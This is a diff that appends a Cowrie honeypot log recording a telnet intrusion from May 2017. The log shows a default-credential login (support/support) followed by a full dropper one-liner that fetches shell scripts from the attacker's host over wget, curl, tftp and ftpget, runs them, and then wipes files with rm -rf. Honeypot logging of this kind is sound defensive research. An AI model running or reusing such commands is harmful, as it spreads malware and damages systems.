@@ -876,3 +876,45 @@
 2017-05-31T05:43:56+0000 [SSHChannel None (7) on SSHService 'ssh-connection' on HoneyPotSSHTransport,245,91.195.103.217] remote eof
 2017-05-31T05:43:56+0000 [SSHChannel None (7) on SSHService 'ssh-connection' on HoneyPotSSHTransport,245,91.195.103.217] remote close
 2017-05-31T05:43:56+0000 [SSHChannel None (7) on SSHService 'ssh-connection' on HoneyPotSSHTransport,245,91.195.103.217] sending close 7
+2017-05-31T05:44:34+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.2.82.187:41910 (10.8.41.81:2223) [session: TT1309]
+2017-05-31T05:44:34+0000 [CowrieTelnetTransport,1309,185.2.82.187] login attempt: 2
+2017-05-31T05:44:34+0000 [CowrieTelnetTransport,1309,185.2.82.187] login return, expect: [support/support]
+2017-05-31T05:44:35+0000 [CowrieTelnetTransport,1309,185.2.82.187] login attempt [support/support] succeeded
+2017-05-31T05:44:37+0000 [CowrieTelnetTransport,1309,185.2.82.187] Opening TTY Log: log/tty/20170531-054437-None-1309i.log
+2017-05-31T05:44:37+0000 [CowrieTelnetTransport,1309,185.2.82.187] Warning: state changed and new state returned
+2017-05-31T05:44:37+0000 [CowrieTelnetTransport,1309,185.2.82.187] CMD: sh
+2017-05-31T05:44:37+0000 [CowrieTelnetTransport,1309,185.2.82.187] Command found: sh 
+2017-05-31T05:44:37+0000 [CowrieTelnetTransport,1309,185.2.82.187] CMD: shell
+2017-05-31T05:44:37+0000 [CowrieTelnetTransport,1309,185.2.82.187] Command not found: shell
+2017-05-31T05:44:37+0000 [CowrieTelnetTransport,1309,185.2.82.187] CMD: cd /tmp; wget http://185.2.82.187/fyfa.sh; curl -O http://185.2.82.187/fyfa.sh; chmod 777 fyfa.sh; sh fyfa.sh; tftp 185.2.82.187 -c get tfyfa.sh; chmod 777 tfyfa.sh; sh tfyfa.sh; tftp -r tfyfa2.sh -g 185.2.82.187; chmod 777 tfyfa2.sh; sh tfyfa2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.2.82.187 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh; rm -rf *
+2017-05-31T05:44:37+0000 [CowrieTelnetTransport,1309,185.2.82.187] Command found: cd /tmp
+2017-05-31T05:44:37+0000 [CowrieTelnetTransport,1309,185.2.82.187] Command found: wget http://185.2.82.187/fyfa.sh
+2017-05-31T05:44:37+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.2.82.187/fyfa.sh>
+2017-05-31T05:44:37+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.2.82.187/fyfa.sh) with SHA-256 cb647789ff8bbed7ba6718754dfded8956df6b872a0c65317314c0f0cc517e11 to dl/cb647789ff8bbed7ba6718754dfded8956df6b872a0c65317314c0f0cc517e11
+2017-05-31T05:44:37+0000 [HTTPPageDownloader,client] Command found: curl -O http://185.2.82.187/fyfa.sh
+2017-05-31T05:44:37+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.2.82.187/fyfa.sh>
+2017-05-31T05:44:37+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.2.82.187/fyfa.sh>
+2017-05-31T05:44:37+0000 [HTTPPageDownloader,client] Not storing duplicate content cb647789ff8bbed7ba6718754dfded8956df6b872a0c65317314c0f0cc517e11
+2017-05-31T05:44:37+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.2.82.187/fyfa.sh) with SHA-256 cb647789ff8bbed7ba6718754dfded8956df6b872a0c65317314c0f0cc517e11 to dl/cb647789ff8bbed7ba6718754dfded8956df6b872a0c65317314c0f0cc517e11
+2017-05-31T05:44:37+0000 [HTTPPageDownloader,client] Command found: chmod 777 /tmp/fyfa.sh
+2017-05-31T05:44:37+0000 [HTTPPageDownloader,client] Command found: sh /tmp/fyfa.sh
+2017-05-31T05:44:37+0000 [HTTPPageDownloader,client] Command found: tftp 185.2.82.187 -c get tfyfa.sh
+2017-05-31T05:44:37+0000 [HTTPPageDownloader,client] Command found: chmod 777 tfyfa.sh
+2017-05-31T05:44:37+0000 [HTTPPageDownloader,client] Command found: sh tfyfa.sh
+2017-05-31T05:44:37+0000 [HTTPPageDownloader,client] Command found: tftp -r tfyfa2.sh -g 185.2.82.187
+2017-05-31T05:44:37+0000 [HTTPPageDownloader,client] Command found: chmod 777 tfyfa2.sh
+2017-05-31T05:44:37+0000 [HTTPPageDownloader,client] Command found: sh tfyfa2.sh
+2017-05-31T05:44:37+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 185.2.82.187 ftp1.sh ftp1.sh
+2017-05-31T05:44:37+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://185.2.82.187/ftp1.sh) with SHA-256 144f72e9c6b693d132a91ad59666dbeb1357e15057384694f2c54feba61c2c31 to dl/144f72e9c6b693d132a91ad59666dbeb1357e15057384694f2c54feba61c2c31
+2017-05-31T05:44:37+0000 [HTTPPageDownloader,client] Command found: sh /tmp/ftp1.sh
+2017-05-31T05:44:37+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/fyfa.sh tfyfa.sh tfyfa2.sh /tmp/ftp1.sh
+2017-05-31T05:44:37+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/.X11-unix /tmp/.ICE-unix
+2017-05-31T05:44:37+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.2.82.187/fyfa.sh>
+2017-05-31T05:44:51+0000 [CowrieTelnetTransport,1309,185.2.82.187] Not storing duplicate content cb647789ff8bbed7ba6718754dfded8956df6b872a0c65317314c0f0cc517e11
+2017-05-31T05:44:51+0000 [CowrieTelnetTransport,1309,185.2.82.187] Saved redir contents with SHA-256 cb647789ff8bbed7ba6718754dfded8956df6b872a0c65317314c0f0cc517e11 to dl/cb647789ff8bbed7ba6718754dfded8956df6b872a0c65317314c0f0cc517e11
+2017-05-31T05:44:51+0000 [CowrieTelnetTransport,1309,185.2.82.187] Not storing duplicate content 144f72e9c6b693d132a91ad59666dbeb1357e15057384694f2c54feba61c2c31
+2017-05-31T05:44:51+0000 [CowrieTelnetTransport,1309,185.2.82.187] Saved redir contents with SHA-256 144f72e9c6b693d132a91ad59666dbeb1357e15057384694f2c54feba61c2c31 to dl/144f72e9c6b693d132a91ad59666dbeb1357e15057384694f2c54feba61c2c31
+2017-05-31T05:44:51+0000 [CowrieTelnetTransport,1309,185.2.82.187] Closing TTY Log: log/tty/20170531-054437-None-1309i.log after 13 seconds
+2017-05-31T05:44:51+0000 [CowrieTelnetTransport,1309,185.2.82.187] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-05-31T05:44:51+0000 [CowrieTelnetTransport,1309,185.2.82.187] Connection lost after 17 seconds
